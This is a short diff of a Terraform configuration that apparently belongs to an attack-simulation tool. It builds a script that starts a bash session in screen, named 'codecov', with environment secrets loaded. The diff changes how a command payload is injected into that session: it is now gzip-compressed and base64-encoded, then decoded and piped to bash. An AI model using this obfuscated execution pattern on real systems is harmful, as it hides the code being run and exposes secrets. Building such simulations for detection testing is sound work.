@@ -20,7 +20,7 @@ locals {
     sleep 30
     exit
     EOT
-    base64_command_payload=base64encode(local.command_payload)
+    base64_command_payload=local.command_payload
     payload = <<-EOT
     START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
     while true; do
@@ -36,7 +36,7 @@ locals {
         screen -d -Logfile /tmp/codecov.log -S codecov -m env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ${local.env_secrets} /bin/bash --noprofile --norc
         screen -S codecov -X colon "logfile flush 0^M"
         log 'sending screen command: ${local.command_payload}';
-        screen -S codecov -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
+        screen -S codecov -p 0 -X stuff "echo '${base64gzip(local.base64_command_payload)}' | base64 -d | gunzip | /bin/bash -^M"
         log 'waiting 30 minutes...';
         sleep 1800
         CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
